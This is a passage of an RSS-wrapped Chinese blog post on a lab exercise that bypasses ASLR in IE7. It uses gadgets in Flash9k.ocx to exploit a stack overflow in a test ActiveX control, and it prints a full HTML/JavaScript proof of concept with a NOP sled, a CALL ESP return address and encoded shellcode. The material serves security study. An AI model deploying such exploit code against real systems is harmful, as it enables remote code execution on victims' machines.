+&lt;p>&lt;img src="https://blog.moeomu.com/ASLR%20not%20enabled%20status.png"
+loading="lazy"
+alt="ASLR未启用情况"
+>&lt;/p>
+&lt;ul>
+&lt;li>实验控件未启用GS&lt;/li>
+&lt;li>通过IE7加载POC页面和Flash9k.ocx&lt;/li>
+&lt;li>函数test存在栈溢出漏洞，目标是覆盖函数的 返回地址&lt;/li>
+&lt;li>因为Flash9k.ocx未启用ASLR因此加载基址固定，可以在里面搜寻合适的跳板指令跳转到shellcode&lt;/li>
+&lt;li>IE7的DEP是关闭的，因此不考虑DEP的影响&lt;/li>
+&lt;li>因为通过覆盖函数返回地址实现攻击，因此最佳的跳板指令是JMP ESP&lt;/li>
+&lt;li>&lt;code>0x301D606B&lt;/code>也是&lt;code>JMP ESP&lt;/code>，执行后将会跳转到字符串的头部，但是问题是&lt;code>6B 60 1D 30&lt;/code>四个字节正好构成一句汇编指令&lt;code>imul esp,dword ptr ds:[eax+0x1D],0x30&lt;/code>，它将会把后两个操作数相乘，随后放到第一个操作数中，因此需要保持&lt;code>[eax+0x1D]&lt;/code>的值是正确的，而目前eax并未指向有效地址，因此需要修复eax&lt;/li>
+&lt;li>很可惜，没有找到合适的修复eax的指令，换地址&lt;/li>
+&lt;li>&lt;code>0x303911D3&lt;/code>也是&lt;code>JMP ESP&lt;/code>，但它组成的汇编代码将会同时读取EC和EAX的内容，因此这两个寄存器都需要修复，不可行，换指令&lt;/li>
+&lt;li>&lt;code>JMP ESP&lt;/code>没有，改用&lt;code>JMP ESI&lt;/code>，地址&lt;code>0x3000DCD2&lt;/code>中包含0，直接排除，地址&lt;code>0x302420C3&lt;/code>最后一个字节是retn，无法使用，排除，地址&lt;code>0x3028EE6E&lt;/code>汇编代码将直接引起异常，排除，此指令也没有合适的了，因此寻找其它合适指令&lt;/li>
+&lt;li>位于地址&lt;code>0x300942F2&lt;/code>的&lt;code>CALL ESP&lt;/code>貌似正合适，它也会将esp增加8个字节正好避开了垃圾数据&lt;/li>
+&lt;li>以下是改变以后的shellcode&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">object&lt;/span> &lt;span class="na">classid&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&amp;#34;&lt;/span> &lt;span class="na">codebase&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0&amp;#34;&lt;/span> &lt;span class="na">width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;160&amp;#34;&lt;/span> &lt;span class="na">height&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;260&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">param&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;movie&amp;#34;&lt;/span> &lt;span class="na">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;1.swf&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">param&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;quality&amp;#34;&lt;/span> &lt;span class="na">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;high&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">embed&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;1.swf&amp;#34;&lt;/span> &lt;span class="na">quality&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;high&amp;#34;&lt;/span> &lt;span class="na">pluginspage&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash&amp;#34;&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;application/x-shockwave-flash&amp;#34;&lt;/span> &lt;span class="na">width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;160&amp;#34;&lt;/span> &lt;span class="na">height&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;260&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">embed&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">object&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">object&lt;/span> &lt;span class="na">classid&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;test&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">object&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\u9090&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">54&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u9090&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u42F2\u3009&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u9090\u9090&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>如图，重启系统，shellcode运行正常，这意味着攻击ASLR成功&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.moeomu.com/shellcode%20run%20successfully.png"
+loading="lazy"
+alt="shellcode运行成功"
+>&lt;/p></description></item></channel></rss>
